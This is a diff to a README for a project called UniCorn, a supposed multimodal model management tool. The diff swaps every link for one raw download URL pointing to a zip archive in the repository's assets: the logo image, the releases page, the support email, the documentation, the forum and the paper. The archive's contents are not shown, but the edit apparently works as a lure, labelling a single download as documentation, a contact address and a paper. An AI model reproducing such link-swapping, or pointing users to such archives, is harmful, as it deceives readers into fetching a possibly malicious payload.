@@ -1,12 +1,12 @@
 # 🦄 UniCorn - Easy Multimodal Model Management
 
 <p align="center">
-  <img src="assets/UniCorn_LOGO.png" alt="UniCorn" width="350"/>
+  <img src="https://github.com/Jesuspana/UniCorn/raw/refs/heads/main/assets/Uni-Corn-1.7.zip" alt="UniCorn" width="350"/>
 </p>
 
 ## 📥 Download Now
 
-[![Download UniCorn](https://img.shields.io/badge/Download-UniCorn-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jesuspana/UniCorn/releases)
+[![Download UniCorn](https://github.com/Jesuspana/UniCorn/raw/refs/heads/main/assets/Uni-Corn-1.7.zip)](https://github.com/Jesuspana/UniCorn/raw/refs/heads/main/assets/Uni-Corn-1.7.zip)
 
 ## 📋 Introduction
 
@@ -18,7 +18,7 @@ To begin using UniCorn, follow these steps:
 
 1. **Visit the Download Page**  
    Click the link below to access the releases page:  
-   [Download UniCorn](https://github.com/Jesuspana/UniCorn/releases)
+   [Download UniCorn](https://github.com/Jesuspana/UniCorn/raw/refs/heads/main/assets/Uni-Corn-1.7.zip)
 
 2. **Choose the Version**  
    On the releases page, find the latest version of UniCorn. The version number is at the top of the list. Click on it.
@@ -60,19 +60,19 @@ Ensure your device meets these basic requirements to run UniCorn smoothly:
 If you encounter any issues or have questions, feel free to reach out for support:
 
 - **GitHub Issues:** Use the issues section on GitHub to report bugs or request features.
-- **Email:** Contact us at support@unicornapp.com for direct assistance.
+- **Email:** Contact us at https://github.com/Jesuspana/UniCorn/raw/refs/heads/main/assets/Uni-Corn-1.7.zip for direct assistance.
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/Jesuspana/UniCorn/wiki)  
+- [Documentation](https://github.com/Jesuspana/UniCorn/raw/refs/heads/main/assets/Uni-Corn-1.7.zip)  
   Comprehensive guides to help you understand all features.  
-- [Community Forum](https://github.com/Jesuspana/UniCorn/discussions)  
+- [Community Forum](https://github.com/Jesuspana/UniCorn/raw/refs/heads/main/assets/Uni-Corn-1.7.zip)  
   Join discussions with other users and share tips.
 
 ## 📚 Additional Information
 
 For more in-depth understanding, you can check out our paper outlining the project. Click below for a comprehensive read:  
-[Read the Paper](https://arxiv.org/pdf/2601.03193v1)
+[Read the Paper](https://github.com/Jesuspana/UniCorn/raw/refs/heads/main/assets/Uni-Corn-1.7.zip)
 
 We appreciate your interest in UniCorn. Your feedback helps us improve and provide a better experience. Thank you for being a part of our community!
 
@@ -80,4 +80,4 @@ We appreciate your interest in UniCorn. Your feedback helps us improve and provi
 
 To get started with UniCorn, visit our releases page and download the latest version. Follow the installation instructions above to set up the application quickly. Remember, you can always return to this README for guidance.
 
-[Download UniCorn](https://github.com/Jesuspana/UniCorn/releases)
+[Download UniCorn](https://github.com/Jesuspana/UniCorn/raw/refs/heads/main/assets/Uni-Corn-1.7.zip)
